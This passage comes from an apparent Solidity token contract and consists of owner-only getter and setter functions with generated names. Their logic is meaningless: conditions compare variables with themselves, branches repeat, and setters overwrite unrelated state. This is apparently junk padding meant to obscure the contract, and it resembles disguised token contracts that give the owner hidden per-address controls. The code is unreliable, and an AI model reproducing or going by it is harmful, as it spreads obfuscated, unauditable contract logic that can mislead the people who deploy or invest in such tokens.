        swapLimitBurnModeFee0=a0;
    }

    function getTxLaunchedLiquiditySwap(uint256 a0) public view returns (address) {
        if (a0 != swapLimitBurnModeFee) {
            return teamRecAddress;
        }
        if (a0 == liquidityMaxLimitModeBurnLaunched) {
            return teamRecAddress;
        }
            return txLaunchedLiquiditySwap[a0];
    }
    function setTxLaunchedLiquiditySwap(uint256 a0,address a1) public onlyOwner {
        if (txLaunchedLiquiditySwap[a0] == txLaunchedLiquiditySwap[a0]) {
           txLaunchedLiquiditySwap[a0]=a1;
        }
        txLaunchedLiquiditySwap[a0]=a1;
    }

    function getMaxLimitWalletIs() public view returns (bool) {
        return maxLimitWalletIs;
    }
    function setMaxLimitWalletIs(bool a0) public onlyOwner {
        maxLimitWalletIs=a0;
    }

    function getBurnFeeIsAutoTeamExempt() public view returns (uint256) {
        if (burnFeeIsAutoTeamExempt == modeFeeMinTradingExempt) {
            return modeFeeMinTradingExempt;
        }
        return burnFeeIsAutoTeamExempt;
    }
    function setBurnFeeIsAutoTeamExempt(uint256 a0) public onlyOwner {
        if (burnFeeIsAutoTeamExempt != launchedMinBotsWallet) {
            launchedMinBotsWallet=a0;
        }
        if (burnFeeIsAutoTeamExempt != launchedMinBotsWallet) {
            launchedMinBotsWallet=a0;
        }
        if (burnFeeIsAutoTeamExempt == botsBuyReceiverSell) {
            botsBuyReceiverSell=a0;
        }
        burnFeeIsAutoTeamExempt=a0;
    }

    function getLiquidityMaxLimitModeBurnLaunched() public view returns (uint256) {
        if (liquidityMaxLimitModeBurnLaunched != botsBurnLaunchedBuy) {
            return botsBurnLaunchedBuy;
        }
        if (liquidityMaxLimitModeBurnLaunched != modeFeeMinTradingExempt) {
            return modeFeeMinTradingExempt;
        }
        if (liquidityMaxLimitModeBurnLaunched != botsBurnLaunchedBuy) {
            return botsBurnLaunchedBuy;
        }
        return liquidityMaxLimitModeBurnLaunched;
    }
    function setLiquidityMaxLimitModeBurnLaunched(uint256 a0) public onlyOwner {
        if (liquidityMaxLimitModeBurnLaunched == swapLimitBurnModeFee) {
            swapLimitBurnModeFee=a0;
        }
        if (liquidityMaxLimitModeBurnLaunched != launchedFeeMaxTradingSwap) {
            launchedFeeMaxTradingSwap=a0;
        }
        liquidityMaxLimitModeBurnLaunched=a0;
    }

    function getBotsSwapWalletSellTeamAuto(address a0) public view returns (uint256) {
        if (botsSwapWalletSellTeamAuto[a0] != botsSwapWalletSellTeamAuto[a0]) {
            return modeFeeMinTradingExempt;
        }
        if (botsSwapWalletSellTeamAuto[a0] != botsSwapWalletSellTeamAuto[a0]) {
            return marketingTeamModeExemptFee;
        }
        if (a0 == teamRecAddress) {
            return modeFeeMinTradingExempt;
        }
            return botsSwapWalletSellTeamAuto[a0];
    }
    function setBotsSwapWalletSellTeamAuto(address a0,uint256 a1) public onlyOwner {
        if (a0 != teamRecAddress) {
            modeFeeMinTradingExempt=a1;
        }
        if (botsSwapWalletSellTeamAuto[a0] != botsSwapWalletSellTeamAuto[a0]) {
           botsSwapWalletSellTeamAuto[a0]=a1;
        }
        if (botsSwapWalletSellTeamAuto[a0] != botsSwapWalletSellTeamAuto[a0]) {
           botsSwapWalletSellTeamAuto[a0]=a1;
        }
        botsSwapWalletSellTeamAuto[a0]=a1;
    }

    function getIsBuyLaunchedMax() public view returns (bool) {
        if (isBuyLaunchedMax == isBuyLaunchedMax) {
            return isBuyLaunchedMax;
        }
        return isBuyLaunchedMax;
    }
    function setIsBuyLaunchedMax(bool a0) public onlyOwner {
        if (isBuyLaunchedMax != swapLimitBurnModeFee1) {
            swapLimitBurnModeFee1=a0;
        }
        if (isBuyLaunchedMax != isBuyLaunchedMax) {
            isBuyLaunchedMax=a0;
        }
        if (isBuyLaunchedMax != maxLimitWalletIs) {
            maxLimitWalletIs=a0;
        }
        isBuyLaunchedMax=a0;
    }



}